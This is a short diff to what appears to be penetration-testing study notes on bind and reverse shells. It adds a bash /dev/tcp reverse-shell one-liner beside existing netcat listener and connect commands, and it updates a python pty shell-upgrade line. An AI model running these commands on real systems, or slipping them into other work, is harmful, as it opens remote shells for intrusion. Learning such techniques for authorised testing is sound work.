@@ -24,6 +24,7 @@ There are two ways to access a shell (bind shell and reverse shell)
   ## Using Netcat for a reverse shell
       Attacker's Host: nc -nlvp <PORT> # The attacker waits for the host to connect to its own machine , in this case its the one listening for connection)
       Remote Machine: nc <IP> <PORT> # Remote machine has the IP address of the attacker and makes connection to it ( well the attacker has a static IP that wont be chabging anytime soon)
+      Or :bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
     
  PS: Only netcat is mentioned here , there are tons of tools to make reverse connection [check payloadallthethings for reverse shell with other tools ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
      
@@ -37,7 +38,7 @@ using python
 
   on victim:
      
-    python -c 'import pty; pty.spawn("/bin/bash")'
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
     
     (press on your keyboard) Ctrl+Z
 
